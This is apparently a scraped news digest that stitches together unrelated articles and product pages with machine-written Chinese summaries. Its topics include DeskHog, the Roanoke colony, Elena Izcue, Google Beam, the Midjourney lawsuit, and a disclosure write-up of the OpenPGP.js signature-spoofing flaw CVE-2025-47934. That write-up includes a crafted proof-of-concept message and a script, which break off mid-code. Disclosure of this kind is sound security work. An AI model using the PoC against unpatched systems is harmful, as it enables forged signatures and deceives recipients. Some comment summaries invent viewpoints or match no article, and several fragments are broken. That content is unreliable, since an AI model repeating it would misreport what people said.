DeskHog packs a ESP32-S3 Reverse TFT Feather in a custom-made 3D printed case. It comes complete with a 240x135 color TFT display, a 10-hour battery life, WiFi, and a cute little LED.
It's a hand-made micro games console. It's a desktop terminal for PostHog data. It's a friend.
Can it play Pong?
Yes.
Can it play Flappy Bird?
Yes.
Can it play Doom?
...We're working on it.
Want
more
hardware?
We included an I²C expansion port, just for people like you.
Of course, we're making some games for it too
We're still nailing down the launch lineup, but you can
build your own
while you wait
Pog
It's Pong, but with a different name. It's perfect for playing on the toilet. Apparently.

Leon Daly
IdleHog
It's a wry satire. It's an idle clicker game. It's delivering shareholder value.

Chris McNeill

It's a roguelike throwback about an endless corridor. Such is life.

Joe Martin

A good idea is worth stealing. Even if it's Charles'.

Chris McNeill
Notchagotchi
We were a little worried we'd be sued if we called this what it really is.
Built by:
Sophie Payne
Flappy Hog
Despite the title, this game has neither hedgehogs nor flapping.
Built by:
Joe Martin
Hogspeed
Test your reflexes with this high-speed, minimal reaction game with ASCII art.
Built by:
Chris McNeill
Pineapple Reflex
Does pineapple belong on pizza? Sophie thinks so.
Built by:
Sophie Payne
Build your own

Get started on GitHub
It will also have important business tools
(A great excuse to expense your DeskHog purchase)

Hate smalltalk? These icebreakers will help.
Built by:
Annika Schmid
Pomodoro Timer
Gives you time to ponder 20 tomatoes.
Built by:

Insight Keeper-upper
Grab graphs from PostHog and squint at them.
Built by:

Your phone and data are
DeskHog's best friends
DeskHog can get online via a captive portal and pull insights from your PostHog projects. Scan the QR code with your phone to connect and link data to the Insight Keeper-upper.
The DIY version of DeskHog already supports simple insights, like big numbers and trends (squinting required), but we're working on more. And we're open source, so you can help!

data.title: Markdown Ninja: markdown-first CMS for bloggers, minimalists and startups.
data.author: unsolved73
data.article_summary: Markdown Ninja是一个面向博主、极简主义者和创业公司的Markdown优先内容管理系统（CMS），是Substack、Mailchimp和Netlify的开源替代品。它简化了网站和新闻通讯的发布流程，用户只需一个命令即可通过Docker发布网站或新闻通讯。该项目遵循AGPL-3.0和CC-BY-SA-4.0许可证，重视安全问题，并提供详细的文档和示例。用户可以通过其官方网站了解更多信息并开始使用。
data.comments_summary:

data.title: Researchers discover evidence in the mystery of America's 'Lost Colony'
data.author: ryan_j_naughton
data.article_summary: 考古学家马克·霍顿（Mark Horton）及其团队经过十年研究，认为失踪的罗阿诺克殖民者可能融入了克罗托安印第安社会，而非遭遇悲剧。他们在北卡罗来纳州的哈特拉斯岛（原称克罗托安岛）发现了铁屑（hammerscale），这是锻造铁器时产生的微小碎片，证明殖民者曾在该地进行金属加工，而这是当时当地印第安人无法掌握的技术。此外，出土的16世纪英国文物如枪支、酒壶、珠子等也支持这一结论。霍顿认为，殖民者并未灭亡，而是成功融入了当地社会。
data.comments_summary:
主要讨论点：罗阿诺克殖民地的消失及其后续去向

不同观点：
• [derbOac] 认为罗阿诺克殖民地的消失是一个渐进的过程，而不是一次性的事件。他引用考古和历史资料，提出殖民者可能是逐渐离开，有些人去了一个地方，有些人去了其他地方。他还指出，有证据表明部分殖民者去了不同的地方，且他们可能没有完全切断彼此的联系。

• [bluGill] 对原住民没有能力锻造铁器提出不同看法，认为这更多是由于当地缺乏优质矿石，而不是因为他们缺乏技术能力。他进一步提出一个讽刺性的假设，即外星人带走了殖民者，并学会了使用铁器，以此来质疑某些历史推论的合理性。

• [duxup] 对早期殖民者的经历表示兴趣，指出某些殖民地非常脆弱且准备不足。

• [chiefalchemist] 提出如果殖民者被同化并繁衍后代，那么应该存在DNA证据。

• [CGMthrowaway] 简要总结认为罗阿诺克殖民地迁移到了哈特拉斯岛，从后湾岛移动到了靠近海的屏障岛。

补充讨论：
• derbOac 的观点强调了殖民地消失的渐进性和多样性，认为不同殖民者可能有不同的去向，并且可能没有完全失去联系。
• bluGill 对原住民技术能力的讨论引出了一个讽刺性假设，质疑了某些历史解释的唯一性，并强调了资源（如矿石）对技术发展的影响。
• chiefalchemist 提出的DNA证据问题为寻找历史真相提供了一个科学视角。
• CGMthrowaway 的总结提供了一个具体的地理迁移假设，即从后湾岛迁移到哈特拉斯岛。

争议焦点：
• 罗阿诺克殖民地消失的具体时间和方式存在不同看法，derbOac 支持渐进过程，而其他评论者则提出不同的假设和质疑。
• 对原住民技术能力的评价，bluGill 认为原住民有能力学会锻造铁器，如果资源允许，而其他评论未直接涉及这一问题。

总结来看，讨论主要围绕罗阿诺克殖民地的消失过程、原住民的技术能力及相关证据等问题展开，不同评论者提供了各自的角度和假设。

Mark Horton, an archaeology professor at the Royal Agricultural University in the United Kingdom, spoke with Fox News Digital about his recent research that may reveal the fate of the Roanoke colonists.
NEW
You can now listen to Fox News articles!
A team of researchers believes they may have cracked one of America's most enduring legends: Where did the settlers of the
Roanoke Colony
go?
The Roanoke Colony, also known as the Lost Colony, was the first
English settlement
attempt in the United States. A group of over 100 colonists settled on North Carolina's Roanoke Island in 1587, led by Sir Walter Raleigh.
John White, the governor of the colony, returned to England for supplies in 1587. When he came back to Roanoke Island in August 1590, he found the settlement mysteriously abandoned – and all the colonists, including his daughter Eleanor Dare and his granddaughter Virginia Dare, gone.
DIVERS UNCOVER MYSTERIOUS 2,500-YEAR-OLD SHIPWRECK, FILLED WITH UNUSUAL ARTIFACTS, OFF COAST OF SICILY
One of the only clues remaining at the site was the word "CROATOAN" carved into a palisade. It either referred to Croatoan Island, which is now called Hatteras Island, or the Croatoan Indians.
The mystery has haunted Americans and Brits for the past four centuries, with several investigations launched into the matter. Whether the colonists were killed by Native Americans, starved to death or
left for greener pastures
has eluded historians.
After 10 years of research, an archaeologist spoke with Fox News Digital about his team's discoveries related to the lost Roanoke Colony.
(Mark Horton; Croatoan Archaeological Society)
But new research suggests the colonists' fate may not have been tragic after all.
Mark Horton, an archaeology professor at Royal Agricultural University in England, spoke with Fox News Digital about his findings.
"This is metal that has to be raised to a relatively high temperature … which, of course, [requires] technology that Native Americans at this period did not have."
For the past decade, the British researcher has worked with the Croatoan Archaeological Society's Scott Dawson to uncover the mystery. Horton said they've uncovered proof the colonists assimilated into Croatoan society, thanks to a trash heap.
(See the video at the top of this article.)
EXPERTS SHOCKED BY ANCIENT KING ARTHUR MANUSCRIPT FOUND TUCKED INSIDE BOOK: 'SURVIVED THE CENTURIES'
"We're looking at the middens — that's the rubbish heaps — of the Native Americans living on Hatteras Island, because we deduced that they would have very rapidly been assimilated into the Native American population," Horton said.
The smoking gun at the site? Hammerscale, which are tiny, flaky bits of iron that come from forging iron.
Horton said it's definitive proof of iron-working on Hatteras Island, which could have only been done by English colonists.
The presence of hammerscale is definitive proof that the colonists moved over to Hatteras Island and lived among the Croatoans, according to archaeologists.
(Mark Horton / Croatoan Archaeological Society)
"The key significance of hammerscale … is that it's evidence of iron-working, of forging, at that moment," he said.
"Hammerscale is what comes off a blacksmith's forge."
ARCHAEOLOGIST SHEDS NEW LIGHT ON ASTONISHING DISCOVERY OF WRECKED SLAVE SHIPS: 'STRANDED ON THE COAST'
Horton added, "This is metal that has to be raised to a relatively high temperature … which, of course,
[requires] technology
that Native Americans at this period did not have."
The excavations took place on North Carolina's Hatteras Island, which was previously known as Croatoan Island.
(Mark Horton / Croatoan Archaeological Society)
Hammerscale shows that the English "must have been working" in this Native American community, according to the expert.
But what if the hammerscale came longer after the Roanoke Colony was abandoned? Horton said that's unlikely.

"We found it stratified … underneath layers that we know date to the late 16th or early 17th century," he said. "So we know that this dates to the period when the lost colonists would have come to Hatteras Island."
"It's a combination of both its archaeological position but also the fact that it's evidence of people actually using an English technology."
Archaeologists say that the discovery of 16th-century English artifacts on Hatteras Island reveals the Roanoke settlers' fate.
(Mark Horton / Croatoan Archaeological Society)
At the site, archaeologists also found guns, nautical fittings, small cannonballs, an engraved slate and a stylus, in addition to
wine glasses and beads
– which all paint a vivid picture of life on Hatteras Island in the 17th century.
When asked if the colonists could have been killed in a later war, Horton said they survived among the Croatoans and successfully assimilated.

data.title: Drawing on Tradition: Elena Izcue's Peruvian Art in the School
data.author: prismatic
data.article_summary: 文章主要介绍了秘鲁艺术家Elena Izcue于1926年在巴黎出版的《El arte peruano en la escuela》系列绘本，该书通过从原住民陶瓷和纺织品中提取图案，旨在让小学生了解并自豪于本土艺术传统。当时，秘鲁艺术界正围绕是否应将印加艺术纳入教育展开争论，而Izcue的作品呼应了印第安美学运动，试图从 pre-Columbian 传统中寻找国家艺术的未来。她的绘本不仅用于课堂，还推动了本土手工艺复兴，影响了巴黎和美国的时尚设计界。Izcue的创作被视为秘鲁艺术复兴的重要推动力，尽管她在国际上获得认可，但其贡献常未被明确提及。
data.comments_summary:
主要讨论点：欧洲是否应出现“ ascendent indigenist aesthetic movement”（崛起的原住民美学运动）

不同观点：
• 支持出现原住民美学运动：
  - recursivedoubts认为，经过100年的现代主义，希望看到欧洲出现一种崛起的原住民美学运动。
  - 这种观点背后隐含了对现代主义长期主导的不满或疲劳，期望看到多元文化美学的兴起，尤其是原住民文化的复兴。

• 质疑或反对该运动：
  - 有人可能质疑，欧洲是否有足够的原住民文化基础来支撑这样的美学运动。例如，欧洲的原住民文化在现代化进程中已经被大量同化或边缘化。
  - 另一种论据是，欧洲的现代主义已经根深蒂固，改变主流审美可能面临巨大阻力，且原住民文化在当代社会中的定义和认同也存在争议。

• 对原住民美学运动的不同理解：
  - 有人可能认为，崛起的原住民美学运动并不一定要完全排斥现代主义，而可以是两者的融合，创造出新的文化表达形式。
  - 另一种理解是，这种运动更应该关注对原住民传统文化的保护与复兴，而不是简单地将其作为一种审美趋势。

补充讨论：
- 争议的焦点之一在于“原住民”在欧洲背景下的定义及其文化代表性。有人可能认为，与其他地区相比，欧洲的原住民概念较为模糊，且历史复杂。
- 另一个讨论点是文化复兴运动的实际可行性及其对社会的影响。例如，如何在不沦为文化挪用的前提下，真正复兴原住民文化，并使其在主流文化中获得应有的重视和尊重。

Drawing on Tradition: Elena Izcue’s
Peruvian Art in the School
(1926)
Elena Izcue,
El arte peruano en la escuela
, vol. 1 (Paris: Editorial Excelsior, 1926).
The 1930 course catalogue at Lima’s Escuela Nacional de Bellas Artes (National School of Fine Arts) announced a new class that would spark months of fierce debate in the popular press. In an
open letter
published in the newspaper
El Comercio
, Antonino Espinosa Saldaña heavily criticized the school’s inclusion of a lecture series on Inca art, stating quite bluntly that such a thing did not exist. “It was not a civilization of aesthetes, cultivators of beauty, of line, of color, of form”, the painter wrote, and while Espinosa deemed the output of earlier cultures in the region more striking, applying even these motifs to contemporary works would produce only “annoying agglomerations of incomprehensible monsters”. The ENBA’s Inca art class — and the calumny it provoked — took place against the backdrop of the ascendent Indigenist aesthetic movement, which sought to anchor Peru’s artistic future in the pre-Columbian past, skipping over, as it did so, the gilt-bedecked products of Spanish colonial rule. Debates about something as innocuous as an art class, then, were shorthand for much larger and more fundamental questions about the nature of Peruvian national identity in the modern era and the position of Indigenous people in society.
It was in the context of these aesthetic and political currents that the designer Elena Izcue produced
El arte peruano en la escuela
(Peruvian art in the school), a set of drawing workbooks featuring motifs taken from Indigenous ceramics and textiles. Published by Editorial Excelsior in Paris in 1926 (although some date the second volume later, to 1929), the two books feature lizards, llamas, and pelicans capering over gridded pages, which both facilitate copywork and highlight the geometric sophistication of each design. (A third volume, referenced by archival sources, appears to have been scrapped due to budgetary constraints.) Izcue’s books came amid a wave of excavations across Peru that radically altered our understanding of the pre-Hispanic world. Julio C. Tello, the godfather of Peruvian archaeology and an acquaintance of Izcue, had recently published his findings on Chavín de Huántar, one of the oldest known urban centers in the Americas. Around the time
El arte peruano
went to print, he also unearthed hundreds of magnificent Paracas textiles at a coastal necropolis with the help of his student Toribio Mejía Xesspe, who would shortly go on to provide the first scholarly description of the Nazca Lines, monumental millennia-old geoglyphs in the desert of southern Peru.
Izcue was deeply influenced by the ancient history that was being rewritten around her, and she wanted to make sure that young people felt pride in autochthonous artistic achievements that had long been either ignored or openly disparaged. “For the first time”, the preface crows, “an effort has been made to extract from the buried traditions of the past — literally buried in cemeteries — the elements of a renaissance of popular art”.
Elena Izcue,
El arte peruano en la escuela
, vol. 2 (Paris: Editorial Excelsior, 1926).
Though Izcue largely frames
El arte peruano
as classroom material for primary school students, contemporary commentators
emphasized
another equally important use for the books: revitalizing domestic craft production by grafting it to a non-European fount of influence. The second volume provides suggestions for what kinds of objects — from book covers to curtains — might be most suited to each motif and even includes visual aids for how the figures might be flipped and tessellated. The adaptation of a pre-Hispanic visual vocabulary to modern design work would become a calling card for Izcue over the course of her own career: after winning a government scholarship in 1927, she moved to Paris along with her sister Victoria (an artist in her own right) and began studying under Fernand Léger. Izcue’s Indigenist aesthetic was
enthusiastically received
by the Parisian fashion world, and she soon found work with couturiers such as House of Worth and Elsa Schiaparelli, who attributes the inspiration for her signature “shocking pink” in part to Andean weaving (though it is worth noting that her employers rarely acknowledged Izcue’s contributions explicitly). Reviews of a 1935 art exhibition that Izcue curated in New York say that Peruvian-inspired designs had become all the rage in the United States, while another credits Izcue with setting off an artistic renaissance in Peru akin to Diego Rivera in Mexico.

data.author: voxadam
data.article_summary: 在Google I/O大会上，Google将其实验项目Starline升级为Google Beam，这是一款3D视频会议系统，让用户仿佛与对方身处同一房间。HP将推出首个Google Beam设备——HP Dimension，售价高达24,999美元。该设备使用六个高速摄像头从多角度捕捉画面，并通过Google的体积视频模型生成3D重建。HP Dimension配备65英寸显示屏，采用光场屏幕技术，无需佩戴特殊眼镜即可体验3D效果。该设备支持Zoom和Google Meet，未来还将加入实时翻译功能。尽管技术先进，但其主要面向企业客户，预计2025年上市。

Amid all the
Gemini hype
at Google I/O last month, the company also turned one of its experiments into a (kind of) real product.
Project Starline
was reborn as Google Beam, a 3D video conferencing system that makes it look like you're in the same room with the other party. Google said HP would reveal the first Beam setup, and now it has. The HP Dimension is coming this year, and the price tag is a predictably hefty $24,999.
Google Beam calls for a lot of advanced hardware, so the high price isn't a surprise. The HP Dimension uses six high-speed cameras positioned around the display to capture the speaker from multiple angles. This visual data is then fed into Google's proprietary volumetric video model, which merges the streams together into a 3D reconstruction of the speaker.
Eventually, there will be Beam systems of various sizes, but the HP model comes with a big 65-inch display. All Beam systems will use light field screen technology, which can show the volumetric model in 3D, eliminating the need to wear a headset or glasses for the 3D effect. Google says Beam can show minute details at 60 fps with millimeter-scale precision.
Obscene price tag aside, Google Beam is impressive technology. We got a glimpse of it at Google I/O, and it really does look like the person you're talking to is on the other side of the table. Google and HP claim that Beam's 3D video makes meetings more efficient, with better display of non-verbal cues and participants experiencing improved recall of details versus a regular 2D chat. Google also promises its Meet-based live translation features will come to Beam later.
Google Beam demo with live translation.
The HP Dimension will support both Zoom and Google Meet, and you don't have to use Google's 3D technology, which requires both ends of a call to have the expensive Beam hardware. So regular 2D chats are still on the table, though you hardly need a $25,000 3D gadget if most of your video calls are with people using the mediocre 2D cameras on their laptops. Unsurprisingly, the HP Dimension is aimed at enterprise customers.
Google Beam's video model requires a lot of intensive cloud processing, which is the only way to achieve the necessary latency for real-time chat. And that isn't free. In addition to spending $24,999 on the hardware, the HP Dimension will require a Google Beam license, the cost of which has not been released. We've reached out to Google for specifics, but it's possible the company has yet to decide. HP will be the first to offer Beam hardware, but it
won't be available until later in 2025
and only for "select customers" to start.

data.title: How Did Dennis Ritchie Produce His PhD Thesis? A Typographical Mystery
data.author: gbacon
data.article_summary: 这篇文章探讨了Dennis Ritchie如何在1968年完成他的哈佛博士论文，尽管由于未知原因他从未正式获得学位，且论文失踪近50年。文章重点回答了三个问题：论文的技术贡献是什么，为什么他没有被授予学位，以及如何准备这篇复杂的数学论文。Ritchie的论文研究了递归函数理论，展示了通过简单循环程序可以实现任意计算，这些程序在现代术语中是图灵完备的。论文使用电动打字机和早期数字文档准备工具（如troff和RUNOFF）制作，揭示了计算机化文档准备初期如何进行复杂排版。

44245843.article_summary: 这篇文章探讨了Dennis Ritchie如何在1968年完成他的哈佛博士论文，尽管由于未知原因他从未正式获得学位，且论文失踪近50年。文章重点回答了三个问题：论文的技术贡献是什么，为什么他没有被授予学位，以及如何准备这篇复杂的数学论文。Ritchie的论文研究了递归函数理论，展示了通过简单循环程序可以实现任意计算，这些程序在现代术语中是图灵完备的。论文使用电动打字机和早期数字文档准备工具（如troff和RUNOFF）制作，揭示了计算机化文档准备初期如何进行复杂排版。

Why is it so fast?
Because Rapidez does not use the Magento frontend stack. Just Laravel on top of the Magento database through Laravel Eloquent for catalog data and GraphQL for other parts like the cart and checkout. Category filters are so fast because of InstantSearch which uses Elasticsearch. For the smooth page transitions Rapidez uses Turbo.
Why headless and not a PWA?
Do you really need a offline experience on your webshop? PWA makes things more complicated then necessary.
Do I need to know Vue?
No, Vue is only used for some functional frontend components like the cart. All Vue components are "renderless" so most likely you never need to touch them because all the HTML is in the Blade files. But some basic knowledge of Vue could be useful.

data.author: andrewfromx
data.article_summary: 迪士尼和NBCUniversal对AI公司Midjourney提起诉讼，指控其图像生成服务未经授权复制版权作品，包括迪士尼的达斯·维达和NBCUniversal的小黄人等著名角色。诉讼称，Midjourney通过让用户输入文本提示生成高品质图像，直接侵犯了原告的版权。原告要求最高法定赔偿金、Midjourney侵权所得的会计报告及禁令救济。迪士尼和NBCUniversal认为，尽管AI技术有潜力成为增强人类创造力的工具，但未经授权的复制仍属侵权行为。Midjourney尚未回应置评请求。此案反映了版权法在AI训练模型中使用的广泛争议。

The Walt Disney Co.
and

sued
AI

Midjourney
on Wednesday, alleging that its image-generating service “functions as a virtual vending machine” that generates “endless unauthorized copies” of copyrighted works.
The lawsuit, filed in U.S. District Court in Los Angeles, is the first major legal action that studios have taken against an AI company. Axios first reported on the lawsuit.
The lawsuit states, “By helping itself to Plaintiffs’ copyrighted works, and then distributing images (and soon videos) that blatantly incorporate and copy Disney’s and Universal’s famous characters—without investing a penny in their creation—Midjourney is the quintessential copyright free-rider and a bottomless pit of plagiarism. Piracy is piracy, and whether an infringing image or video is made with AI or another technology does not make it any less infringing.”

Disney and NBCU are seeking unspecified maximum statutory damages, an accounting of Midjourney’s proceeds from the alleged infringement, and injunctive relief.
Watch on Deadline
As an example, the lawsuit states that if a Midjourney subscriber “submits a simple text prompt requesting an image of the character
Darth Vader
in a particular setting or doing a particular action, Midjourney obliges by generating and displaying a high quality, downloadable image featuring Disney’s copyrighted Darth Vader character.” The same is true of NBCU’s Minions character. The lawsuit features the images, as well as a number of other examples.
Representatives for Midjourney did not immediately respond to request for comment.
Read Disney and NBCUniversal’s AI lawsuit.
The lawsuit also delves into the use of copyrighted material to train AI models, a practice that is the source of fierce debate between major AI firms and content companies. The lawsuit noted that Midjourney has been teasing a new video service, “meaning that Midjourney is very likely already infringing Plaintiffs’ copyrighted works.”
As Congress has weighed new laws to regulate AI, the official position of the Motion Picture Association
has been that existing copyright law
is sufficient to address a new front in the piracy wars. The MPA has emphasized the need for flexibility, including leaving up to the court’s to decide whether the use of copyrighted content in training models is a “fair use.”
The New York Times and book authors, among others, have sued AI companies over the use of copyrighted material. But the studios suggest that Midjourney’s use of copyrighted works was more obvious.
“This case is not a ‘close call’ under well-settled copyright law,” the lawsuit states, adding that Midjourney “sells subscriptions to consumers so that they can view and download copies of Plaintiffs’ valuable copyrighted characters. That is textbook
copyright infringement
.”
The studios claim that Midjourney could implement protection measures to prevent its image service from generating infringing images, but it has not done so. The studios said that before the legal action they asked Midjourney to take such action, but it instead has “continued to release new versions of its Image Service, which, according to Midjourney’s founder and CEO, have even higher quality infringing images.”
Horacio Gutierrez, senior executive vice president and chief legal and compliance officer for Disney, said in a statement, “Our world-class IP is built on decades of financial investment, creativity and innovation—investments only made possible by the incentives embodied in copyright law that give creators the exclusive right to profit from their works. We are bullish on the promise of AI technology and optimistic about how it can be used responsibly as a tool to further human creativity. But piracy is piracy, and the fact that it’s done by an AI company does not make it any less infringing.”

data.article_summary: 本文介绍了OpenPGP.js库中的一个漏洞（CVE-2025-47934），该漏洞允许攻击者在获得目标签名者（如"Alice"）的有效签名后，伪造任意签名，使之看似由该签名者签署。该漏洞存在于v5.11.3和v6.1.1之前的版本中，已被修复。漏洞利用方式涉及构造一个包含额外压缩数据包的PGP消息，虽然该消息无效，但OpenPGP.js仍会验证通过并返回错误的签名数据。文章提供了概念验证代码，展示了如何滥用此漏洞。由于PGP的核心原则受到影响，该漏洞被视为关键风险。
data.comments_summary:
主要讨论点：PGP加密系统的设计问题及其引发的漏洞争议

不同观点：
• [tptacek 的观点]  
PGP的"包"格式设计不正常，现代加密系统已经不再采用类似的复杂格式。这种设计不仅不合理，而且引发了多次问题。当前继续使用PGP只是因为历史原因（路径依赖）。建议彻底废弃现有系统，重新设计一个新的加密系统，哪怕称之为"PGP2"也可以。

• [woodruffw 的观点]  
PGP的编码复杂性是导致漏洞频发的原因之一，每年都会出现严重的解析漏洞。Latacora的一篇文章指出，PGP的编码复杂性只是其众多问题中的一个，甚至可能排不进前三名。woodruffw 还提到2022年有人向oss-sec发送了一个武器化的压缩包，进一步说明PGP在实际应用中的安全隐患。

补充讨论：
• PGP的设计复杂性和历史遗留问题  
两个评论者都提到了PGP的设计复杂性和历史遗留问题。tptacek认为这种设计从根本上是不合理的，而woodruffw则指出这种复杂性只是PGP众多问题中的一个。

• 废弃PGP的建议  
tptacek明确建议废弃现有的PGP系统，重新设计一个新的加密系统，哪怕名字上延续"PGP"的传统。woodruffw虽然没有直接提出废弃PGP，但引用的文章和例子都暗示了PGP系统的多重问题，支持对现有系统进行彻底反思。

争议焦点：
• 是否应该彻底废弃PGP系统  
tptacek明确主张废弃PGP，而woodruffw则更多是指出问题和安全隐患，没有明确提出废弃系统的建议，但引用的外部文章和例子都显示了对PGP系统的不满和反思。

总结：
PGP系统的设计复杂性和历史遗留问题引发了关于其安全性和实用性的争议。一方主张彻底废弃现有系统，重新设计新的加密系统，另一方则通过引用外部文章和实例，暗示PGP的诸多问题，但没有明确提出废弃建议。争议的焦点在于是否应该彻底废弃PGP系统。

CVE-2025-47934 – Spoofing OpenPGP.js signature verification
Share article
TL;DR
This is a write-up of
CVE-2025-47934
, a vulnerability in OpenPGP.js found by Codean Labs, which was patched in v5.11.3 and v6.1.1.
After obtaining a valid signature made by a target author (“Alice”), an attacker could abuse this vulnerability to “spoof” arbitrary signatures by Alice (even as encrypted messages), i.e. making it look (to OpenPGP.js users) as if Alice signed any arbitrary message. Given that this is a core principle of PGP which directly affects some integrating applications, the overall risk was considered to be critical.
This write-up explains how this was possible, and provides a proof-of-concept at the end.
Introduction
The OpenPGP.js library provides an implementation of the OpenPGP standard specified in
RFC 9580
. If you’ve ever used encrypted email or signed git commits, you may be familiar with this standard. On a high level the OpenPGP standard supports message encryption (symmetric and asymmetric), message signing, and functionality for key management.
With OpenPGP.js, it is possible to do all of this in JavaScript. It is used by several web-based email clients that support encryption, including Mailvelope and Proton Mail (though the latter was not affected by this issue).
The OpenPGP message format
All PGP payloads (messages, detached signatures and keys) simply consist of a sequence of packets; there is no overarching header. These packets follow a relatively simple but custom binary protocol as defined by the standard. The resulting binary payload can be sent as-is but is often base64-encoded, resulting in an “ASCII-armored” payload such as the following:
-----BEGIN PGP MESSAGE-----
owGbwMvMwCV2JXpbW1xI0SnG0zxJDBkOns8zUnNy8rk6SlkYxLgYZMUUWWJ1LuTu
9HFSqpFcxgtTzcoEUsrAxSkAE4nSYPgrzdL1bQ1bvfG9h44/3Dtkk7njvjC9XHE/
2kzwLeOV+vTNjAyHZt4/96P3wN0H7x7Y79oondUbIc6a+Onj3578CtEn4Xu5AQ==
=0dLq
-----END PGP MESSAGE-----
This signed message consists of the following packets:
Compressed Data
packet: itself containing a ZIP-compressed packet-list:
One-Pass Signature
packet: an optional packet containing (among other things) the hash algorithm used, so the verifier can already start hashing the data that follows.
Literal Data
packet: containing the message “hello”.
Signature
packet: containing the cryptographic (EdDSA) signature on the hash of the data before it.
There is quite some flexibility in this structure. For example, the enveloping
Compressed Data
packet is entirely optional. Alternatively, the inner
Literal Data
packet could be replaced with a
Compressed Data
packet, containing even more packets, for example those belonging to an encrypted message or another signature. The allowed packet structures are formalized in grammar rules defined in the standard (
RFC 9580
, Section 10.3).
An invalid packet list
Now let’s consider a PGP message with the following packet list, where packets 1-3 make up a legitimate signed message but a fourth packet is added:
One-Pass Signature
packet
Literal Data
packet (“legitimate”)
Signature
packet (valid over packet 1)
Compressed Data
packet, containing
Literal Data
packet (“malicious”)
Because of the stray
Compressed Data
packet at the end, this is not a valid OpenPGP message.
Still, it turns out that OpenPGP.js not only accepts the message as valid, but it returns “malicious” as the signed data while verifying the signature on “legitimate”!
To demonstrate this, let’s take a simple verification program, similar to what is given in the official
documentation
, and give it our peculiar packet list as a message:
const openpgp = require('openpgp');
(async () => {
// Generated using:
//   cat \
//     <(echo "legitimate" | gpg -s -z0) \
//     <(printf "\xc8\x12\0\xcb\x0f\x62\0\0\0\0\0malicious") \
//   | base64
let armoredMessage = `
-----BEGIN PGP MESSAGE-----
kA0DAAoW1Fu2hl5UcsoByxFiAGhBNptsZWdpdGltYXRlCoh1BAAWCgAdFiEEXSzQbblMQiJ8GaYN
1Fu2hl5UcsoFAmhBNpsACgkQ1Fu2hl5UcsqE0QD/bsWYHJrrrK8RM8VgB4Z3K64zWfp49BOi+x0s
9VJKyRoBALJdQhGzPwCERCANPR+KdX5ZdrX54ZpY9mriFG6O4hsFyBIAyw9iAAAAAABtYWxpY2lv
dXM=
-----END PGP MESSAGE-----`;
// public key of thomas@codean.io
const publicKeyArmored = `
-----BEGIN PGP PUBLIC KEY BLOCK-----
mDMEZSAfBhYJKwYBBAHaRw8BAQdAfdgd2yxL+pYN91ENyp/VZVdWXLjYDONG47jM
4dDZDMG0IFRob21hcyBSaW5zbWEgPHRob21hc0Bjb2RlYW4uaW8+iI8EExYIADcW
IQRdLNBtuUxCInwZpg3UW7aGXlRyygUCZSAfBgUJBaOagAIbAwQLCQgHBRUICQoL
BRYCAwEAAAoJENRbtoZeVHLKpvIBANiaDeLPyaQyHkuzB8T6ZqvfJi4dXNlsqT2F
dlUUip4ZAQDSAljghQC9jAQu8I8yMrQJd4SXD1EMH+NLNNYCDEZCC7g4BGUgHwYS
CisGAQQBl1UBBQEBB0DOFmUm2nMIda8PzTquulLLy/bFwDtSqAiK1EBqEdvbaAMB
CAeIfgQYFggAJhYhBF0s0G25TEIifBmmDdRbtoZeVHLKBQJlIB8GBQkFo5qAAhsM
AAoJENRbtoZeVHLKCE8BAJEXE6za1G6pFpaZWKBRMlCbBDSE4rc7iEn5MpC56WtQ
AQCnVhRNYBjQ7Bo/VX1rx2+6wx84EXOFmoW80F96QmN0Bw==
=Obk+
-----END PGP PUBLIC KEY BLOCK-----`;
const publicKey = await openpgp.readKey({ armoredKey: publicKeyArmored });

data.title: Building a Debugger
data.author: sohkamyung
data.article_summary: 《Building a Debugger》是一本由Sy Brand撰写的指南，旨在教读者如何从零开始构建一个适用于x64 Linux系统的调试器。书中详细介绍了如何实现调试器的各种功能，包括附加到进程、读写寄存器、设置硬件和软件断点、输出反汇编代码、支持多线程等。通过逐步构建一个完整的调试器，读者还将学习到有关操作系统、编译器、软件测试和低级编程的丰富知识。本书适合想要深入理解调试器工作原理并提升编程技能的开发者。书中包含大量实践代码示例，并提供了早期访问章节和免费电子书版。

Contents
Download Chapter 3: Attaching to a Process
Look Inside!
If debuggers seem like magic to you, there is no better way to demystify them than to write your own. This book will show you exactly how to do it, walking you through the entire process of building a debugger for x64 Linux systems using C++. As you go from an empty filesystem folder to a fully fledged debugger capable of setting breakpoints, stepping through code, manipulating variables, and more, you’ll learn how to:
Attach to a process
Read and write to registers
Set hardware and software breakpoints
Output disassembly
Support multithreading and other tasks
As you add features to your debugger, you’ll also pick up a wealth of knowledge about operating systems, compilers, software testing, and low-level programming that you can use in your day-to-day development.
Author Bio
Sy Brand
is Microsoft’s C++ Developer Advocate. With more than 10 years’ experience in developer tooling, they’ve worked on profilers, compilers, language runtimes, standard libraries, and, of course, debuggers. They’ve also contributed to the standards for C++, DWARF, and HSA.
They graduated from the University of St Andrews with a 1st class degree in computer science, where they specialized in compiler implementation.
Outside the world of technology, they are a published poet, maker of experimental films and music, activist, and parent to three cats and one entire human.

Databricks Academy, the hub for learning data and AI on Databricks, is now offering all self-paced courses for free to all users to meet the increasing demand for data and AI talent
Today, we are excited to announce the availability of
Databricks Free Edition
, a product for learning and exploring the latest data and AI technologies for free.
Free Edition offers the same suite of tools that were previously limited to paying customers, allowing everyone to experiment and learn all the latest in data and AI technologies.
Try it
today.
With Free Edition, users can now:
Build AI agents and applications
using Mosaic AI, and learn how to prepare data, deploy, evaluate, and govern AI systems, while experimenting with some of the latest foundation models.
Collaborate on data science and ML projects
in shared notebooks that support Python, SQL, and more — perfect for group work, experimentation, and showcasing your work.
Create beautiful, interactive dashboards
and conversational data experiences
powered by AI.
Query and analyze data with SQL
using the built-in SQL editor to sharpen your data analysis skills and explore real datasets like a pro.
Learn how to build reliable data pipelines
and become a data engineer using Databricks Lakeflow to ingest, transform, and orchestrate data from various sources.
Get instant coding help while you learn

Invite friends and teammates to collaborate

All of this is available for
free

Forbes

Hobbyists and learners need to
learn
and
experiment

training

Universities Use Free Edition to Build Future-Ready Talent

data.comments_summary:
主要讨论点：对新闻文章中报道的“AI生成内容的可信度”问题进行讨论

不同观点：
• **观点一：对AI生成内容的准确性持怀疑态度**  
  [bookofjoe] 对文章中提到的AI生成内容表示不信任，尤其是当这些内容涉及专业领域时。他指出，AI经常会生成看似权威但实际上错误的信息，因此认为依赖AI生成内容是危险的。他举例说明AI可能会在医学或法律等领域犯下严重错误，并认为人类专家的审核不可或缺。

• **观点二：AI生成内容具有一定的参考价值**  
